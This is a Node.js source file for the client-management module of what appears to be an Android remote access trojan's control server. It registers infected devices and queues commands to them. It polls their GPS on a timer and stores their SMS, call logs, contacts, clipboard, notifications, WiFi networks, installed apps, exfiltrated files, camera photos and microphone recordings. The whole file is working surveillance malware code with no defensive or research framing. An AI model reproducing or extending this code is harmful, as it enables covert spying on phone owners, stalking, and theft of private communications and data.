const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const db = require('./db');
const { logger } = require('./logs');

class ClientManager {
    constructor() {
        this.sockets = {};
        this.dbs = {};
        this.gpsTimers = {};
        this.transfers = {};
        this.commandQueue = new Map(); // Pending commands queue
        logger.info('Client manager initialized');
    }

    // Connection handling
    connect(socket, id, data) {
        try {
            this.sockets[id] = socket;
            
            const client = db.main.get('clients').find({ id });
            const now = new Date().toISOString();
            
            if (client.value()) {
                // Update existing client
                client.assign({ 
                    lastSeen: now, 
                    online: true, 
                    reconnectCount: (client.value().reconnectCount || 0) + 1,
                    ...data 
                }).write();
                logger.clientConnected(id, data.ip, data.device);
            } else {
                // New client
                db.main.get('clients').push({ 
                    id, 
                    firstSeen: now, 
                    lastSeen: now, 
                    online: true, 
                    reconnectCount: 0,
                    ...data 
                }).write();
                logger.clientConnected(id, data.ip, data.device);
            }
            
            this.setupHandlers(id);
            this.runQueue(id);
            this.restoreGpsPolling(id);
        } catch (e) {
            logger.systemError('Client connect failed', e);
        }
    }

    disconnect(id) {
        try {
            db.main.get('clients').find({ id }).assign({ 
                online: false, 
                lastSeen: new Date().toISOString() 
            }).write();
            
            delete this.sockets[id];
            this.clearGps(id);
            
            // Clean up transfers
            Object.keys(this.transfers).forEach(tid => {
                if (tid.startsWith(id)) {
                    delete this.transfers[tid];
                }
            });
            
            logger.clientDisconnected(id);
        } catch (e) {
            logger.systemError('Client disconnect failed', e);
        }
    }

    getDb(id) {
        if (!this.dbs[id]) {
            try {
                this.dbs[id] = db.client(id);
            } catch (e) {
                logger.systemError('Failed to get client DB', e);
                return null;
            }
        }
        return this.dbs[id];
    }

    // Lists
    online() { 
        return db.main.get('clients').filter({ online: true }).value(); 
    }
    
    offline() { 
        return db.main.get('clients').filter({ online: false }).value(); 
    }
    
    all() {
        return db.main.get('clients').value();
    }
    
    get(id) {
        return db.main.get('clients').find({ id }).value();
    }

    // Commands
    send(id, cmd, params = {}, cb = () => {}) {
        try {
            const client = this.get(id);
            if (!client) {
                logger.commandFailed(id, cmd, 'Client not found');
                return cb('Client not found');
            }
            
            params.type = cmd;
            params.timestamp = Date.now();
            
            if (this.sockets[id]) {
                this.sockets[id].emit('order', params);
                logger.commandSent(id, cmd, params);
                cb(null, 'Sent');
            } else {
                this.queue(id, params, cb);
            }
        } catch (e) {
            logger.commandFailed(id, cmd, e.message);
            cb(e.message);
        }
    }

    queue(id, params, cb) {
        try {
            const cdb = this.getDb(id);
            if (!cdb) {
                logger.commandFailed(id, params.type, 'Database unavailable');
                return cb('Database unavailable');
            }
            
            // Check for duplicate command
            const existing = cdb.get('queue').find({ type: params.type }).value();
            if (existing) {
                logger.warning(`Command ${params.type} already queued for ${id}`, 'client');
                return cb('Already queued');
            }
            
            params.uid = Date.now();
            cdb.get('queue').push(params).write();
            logger.commandQueued(id, params.type);
            cb(null, 'Queued');
        } catch (e) {
            logger.commandFailed(id, params.type, e.message);
            cb(e.message);
        }
    }

    runQueue(id) {
        try {
            const cdb = this.getDb(id);
            if (!cdb) return;
            
            const queue = cdb.get('queue').value();
            if (!queue || queue.length === 0) return;
            
            queue.forEach(cmd => {
                if (this.sockets[id]) {
                    this.sockets[id].emit('order', cmd);
                    cdb.get('queue').remove({ uid: cmd.uid }).write();
                    logger.info(`Executed queued command ${cmd.type} for ${id}`, 'client');
                }
            });
        } catch (e) {
            logger.systemError('Run queue failed', e);
        }
    }

    // GPS polling
    setGps(id, interval) {
        try {
            this.clearGps(id);
            
            const cdb = this.getDb(id);
            
            if (interval > 0 && this.sockets[id]) {
                this.gpsTimers[id] = setInterval(() => {
                    this.send(id, config.msg.location, {});
                }, interval * 1000);
                
                if (cdb) {
                    cdb.set('gpsInterval', interval).write();
                }
                
                logger.info(`GPS polling started for ${id} (interval: ${interval}s)`, 'client');
            } else if (interval === 0) {
                if (cdb) {
                    cdb.set('gpsInterval', 0).write();
                }
                logger.info(`GPS polling stopped for ${id}`, 'client');
            }
            
            return true;
        } catch (e) {
            logger.systemError('Set GPS failed', e);
            return false;
        }
    }

    clearGps(id) {
        if (this.gpsTimers[id]) {
            clearInterval(this.gpsTimers[id]);
            delete this.gpsTimers[id];
        }
    }

    restoreGpsPolling(id) {
        try {
            const cdb = this.getDb(id);
            if (!cdb) return;
            
            const interval = cdb.get('gpsInterval').value();
            if (interval && interval > 0) {
                this.setGps(id, interval);
            }
        } catch (e) {
            logger.systemError('Restore GPS failed', e);
        }
    }

    // Data for pages
    getData(id, page) {
        try {
            const cdb = this.getDb(id);
            const client = this.get(id);
            
            if (!client) return null;
            
            const pages = {
                info: () => ({ client }),
                sms: () => ({ 
                    list: cdb?.get('sms').value() || [],
                    total: (cdb?.get('sms').value() || []).length
                }),
                calls: () => ({ 
                    list: cdb?.get('calls').value() || [],
                    total: (cdb?.get('calls').value() || []).length
                }),
                contacts: () => ({ 
                    list: cdb?.get('contacts').value() || [],
                    total: (cdb?.get('contacts').value() || []).length
                }),
                wifi: () => ({ 
                    list: cdb?.get('wifi').value() || [],
                    total: (cdb?.get('wifi').value() || []).length
                }),
                clipboard: () => ({ 
                    list: (cdb?.get('clipboard').value() || []).slice(-100) // Last 100
                }),
                notifications: () => ({ 
                    list: (cdb?.get('notifications').value() || []).slice(-100) // Last 100
                }),
                permissions: () => ({ 
                    list: cdb?.get('permissions').value() || [],
                    total: (cdb?.get('permissions').value() || []).length
                }),
                apps: () => ({ 
                    list: cdb?.get('apps').value() || [],
                    total: (cdb?.get('apps').value() || []).length
                }),
                gps: () => ({ 
                    list: (cdb?.get('gps').value() || []).slice(-50), // Last 50 locations
                    interval: cdb?.get('gpsInterval').value() || 0 
                }),
                files: () => ({ 
                    list: cdb?.get('files').value() || [],
                    path: cdb?.get('currentPath').value() || ''
                }),
                downloads: () => ({ 
                    list: cdb?.get('downloads').value() || [],
                    total: (cdb?.get('downloads').value() || []).length
                }),
                camera: () => ({ 
                    cameras: cdb?.get('cameras').value() || [], 
                    photos: (cdb?.get('photos').value() || []).slice(-50) // Last 50 photos
                }),
                mic: () => ({})
            };
            
            return pages[page] ? pages[page]() : null;
        } catch (e) {
            logger.systemError('Get data failed', e);
            return null;
        }
    }

    // Socket event handlers
    setupHandlers(id) {
        const socket = this.sockets[id];
        const cdb = this.getDb(id);
        
        if (!socket || !cdb) {
            logger.error(`Failed to setup handlers for ${id}`, 'client');
            return;
        }
        
        socket.on('disconnect', (reason) => {
            logger.info(`Client ${id} disconnected: ${reason}`, 'client');
            this.disconnect(id);
        });
        
        socket.on('pong', () => {
            // Update last seen on pong
            db.main.get('clients').find({ id }).assign({ 
                lastSeen: new Date().toISOString() 
            }).write();
        });
        
        // SMS
        socket.on(config.msg.sms, data => {
            try {
                if (data.smslist) {
                    // Limit stored SMS
                    const list = data.smslist.slice(0, 500);
                    cdb.set('sms', list).write();
                    logger.dataReceived(id, 'SMS', list.length);
                } else if (data.error) {
                    logger.warning(`SMS error from ${id}: ${data.error}`, 'client');
                }
            } catch (e) {
                logger.systemError('SMS handler failed', e);
            }
        });
        
        // Calls
        socket.on(config.msg.calls, data => {
            try {
                if (data.callsList) {
                    const list = data.callsList.slice(0, 500);
                    cdb.set('calls', list).write();
                    logger.dataReceived(id, 'calls', list.length);
                } else if (data.error) {
                    logger.warning(`Calls error from ${id}: ${data.error}`, 'client');
                }
            } catch (e) {
                logger.systemError('Calls handler failed', e);
            }
        });
        
        // Contacts
        socket.on(config.msg.contacts, data => {
            try {
                if (data.contactsList) {
                    cdb.set('contacts', data.contactsList).write();
                    logger.dataReceived(id, 'contacts', data.contactsList.length);
                } else if (data.error) {
                    logger.warning(`Contacts error from ${id}: ${data.error}`, 'client');
                }
            } catch (e) {
                logger.systemError('Contacts handler failed', e);
            }
        });
        
        // WiFi
        socket.on(config.msg.wifi, data => {
            try {
                if (data.networks) {
                    cdb.set('wifi', data.networks).write();
                    logger.dataReceived(id, 'WiFi networks', data.networks.length);
                } else if (data.error) {
                    logger.warning(`WiFi error from ${id}: ${data.error}`, 'client');
                }
            } catch (e) {
                logger.systemError('WiFi handler failed', e);
            }
        });
        
        // Clipboard
        socket.on(config.msg.clipboard, data => {
            try {
                if (data.text) {
                    const list = cdb.get('clipboard').value() || [];
                    // Keep last 200 entries
                    if (list.length >= 200) {
                        cdb.set('clipboard', list.slice(-199)).write();
                    }
                    cdb.get('clipboard').push({ 
                        text: data.text, 
                        time: new Date().toISOString() 
                    }).write();
                    logger.dataReceived(id, 'clipboard');
                }
            } catch (e) {
                logger.systemError('Clipboard handler failed', e);
            }
        });
        
        // Notifications
        socket.on(config.msg.notification, data => {
            try {
                const list = cdb.get('notifications').value() || [];
                // Keep last 200 entries
                if (list.length >= 200) {
                    cdb.set('notifications', list.slice(-199)).write();
                }
                cdb.get('notifications').push({ 
                    ...data, 
                    time: new Date().toISOString() 
                }).write();
                logger.dataReceived(id, 'notification');
            } catch (e) {
                logger.systemError('Notification handler failed', e);
            }
        });
        
        // Permissions
        socket.on(config.msg.permissions, data => {
            try {
                if (data.permissions) {
                    cdb.set('permissions', data.permissions).write();
                    logger.dataReceived(id, 'permissions', data.permissions.length);
                }
            } catch (e) {
                logger.systemError('Permissions handler failed', e);
            }
        });
        
        // Apps
        socket.on(config.msg.apps, data => {
            try {
                if (data.apps) {
                    cdb.set('apps', data.apps).write();
                    logger.dataReceived(id, 'apps', data.apps.length);
                } else if (data.error) {
                    logger.warning(`Apps error from ${id}: ${data.error}`, 'client');
                }
            } catch (e) {
                logger.systemError('Apps handler failed', e);
            }
        });
        
        // Location
        socket.on(config.msg.location, data => {
            try {
                if (data.latitude) {
                    const list = cdb.get('gps').value() || [];
                    // Keep last 100 locations
                    if (list.length >= 100) {
                        cdb.set('gps', list.slice(-99)).write();
                    }
                    cdb.get('gps').push({ 
                        ...data, 
                        time: new Date().toISOString() 
                    }).write();
                    logger.dataReceived(id, 'GPS location');
                }
            } catch (e) {
                logger.systemError('Location handler failed', e);
            }
        });
        
        // Files
        socket.on(config.msg.files, data => this.handleFiles(id, data));
        
        // Camera
        socket.on(config.msg.camera, data => this.handleCamera(id, data));
        
        // Mic
        socket.on(config.msg.mic, data => this.handleMic(id, data));
    }

    handleFiles(id, data) {
        try {
            const cdb = this.getDb(id);
            if (!cdb) return;
            
            if (data.type === 'list') {
                cdb.set('files', data.list || []).write();
                cdb.set('currentPath', data.path || '').write();
                logger.dataReceived(id, 'file list', data.list?.length || 0);
            } else if (data.type === 'download' && data.buffer) {
                this.saveFile(id, data.name, data.buffer, 'downloads', data.size);
            } else if (data.type === 'download_start') {
                const transferId = `${id}_${data.transferId}`;
                this.transfers[transferId] = { 
                    name: data.name, 
                    chunks: [], 
                    total: data.totalChunks,
                    startTime: Date.now()
                };
                logger.info(`File transfer started: ${data.name} from ${id}`, 'file');
            } else if (data.type === 'download_chunk') {
                const transferId = `${id}_${data.transferId}`;
                const t = this.transfers?.[transferId];
                if (t) t.chunks[data.chunkIndex] = data.chunkData;
            } else if (data.type === 'download_end') {
                const transferId = `${id}_${data.transferId}`;
                const t = this.transfers?.[transferId];
                if (t) {
                    this.saveFile(id, t.name, t.chunks.join(''), 'downloads');
                    delete this.transfers[transferId];
                    logger.info(`File transfer completed: ${t.name} from ${id}`, 'file');
                }
            } else if (data.type === 'error') {
                logger.warning(`File error from ${id}: ${data.error}`, 'file');
            }
        } catch (e) {
            logger.systemError('Files handler failed', e);
        }
    }

    handleCamera(id, data) {
        try {
            const cdb = this.getDb(id);
            if (!cdb) return;
            
            if (data.camList) {
                cdb.set('cameras', data.list || []).write();
                logger.dataReceived(id, 'camera list', data.list?.length || 0);
            } else if (data.image && data.buffer) {
                const timestamp = data.timestamp || Date.now();
                this.saveFile(id, `cam${data.cameraId}_${timestamp}.jpg`, data.buffer, 'photos', data.size);
            }
        } catch (e) {
            logger.systemError('Camera handler failed', e);
        }
    }

    handleMic(id, data) {
        try {
            if (data.file && data.buffer) {
                const name = data.name || `mic_${Date.now()}.mp4`;
                this.saveFile(id, name, data.buffer, 'downloads', data.size);
            }
        } catch (e) {
            logger.systemError('Mic handler failed', e);
        }
    }

    saveFile(id, name, buffer, type, size = null) {
        const dir = type === 'photos' ? config.photosPath : config.downloadsPath;
        const hash = crypto.createHash('md5').update(Date.now().toString()).digest('hex').slice(0, 10);
        const ext = path.extname(name) || '.bin';
        const filename = `${hash}${ext}`;
        const filepath = path.join(dir, filename);
        
        try {
            const data = typeof buffer === 'string' ? Buffer.from(buffer, 'base64') : buffer;
            fs.writeFileSync(filepath, data);
            
            const cdb = this.getDb(id);
            if (cdb) {
                const entry = { 
                    name, 
                    file: `/${type === 'photos' ? 'photos' : 'downloads'}/${filename}`, 
                    time: new Date().toISOString(),
                    size: size || data.length
                };
                
                const listKey = type === 'photos' ? 'photos' : 'downloads';
                const list = cdb.get(listKey).value() || [];
                
                // Keep last 100 files
                if (list.length >= 100) {
                    // Remove old files
                    const toRemove = list.slice(0, list.length - 99);
                    toRemove.forEach(item => {
                        try {
                            const oldPath = path.join(dir, path.basename(item.file));
                            if (fs.existsSync(oldPath)) fs.unlinkSync(oldPath);
                        } catch (ignored) {}
                    });
                    cdb.set(listKey, list.slice(-99)).write();
                }
                
                cdb.get(listKey).push(entry).write();
            }
            
            logger.fileSaved(id, name, type);
        } catch (e) {
            logger.fileSaveFailed(id, name, e.message);
        }
    }

    // Cleanup old clients
    cleanup(maxAge = 30 * 24 * 60 * 60 * 1000) { // 30 days default
        try {
            const clients = db.main.get('clients').value();
            const now = Date.now();
            
            clients.forEach(client => {
                if (client.lastSeen) {
                    const lastSeen = new Date(client.lastSeen).getTime();
                    if (now - lastSeen > maxAge && !client.online) {
                        // Remove client
                        db.main.get('clients').remove({ id: client.id }).write();
                        
                        // Remove client DB
                        const clientDbPath = path.join(config.dbPath, 'clients', `${client.id}.json`);
                        if (fs.existsSync(clientDbPath)) {
                            fs.unlinkSync(clientDbPath);
                        }
                        
                        logger.info(`Cleaned up stale client: ${client.id}`, 'system');
                    }
                }
            });
        } catch (e) {
            logger.systemError('Cleanup failed', e);
        }
    }
}

module.exports = new ClientManager();
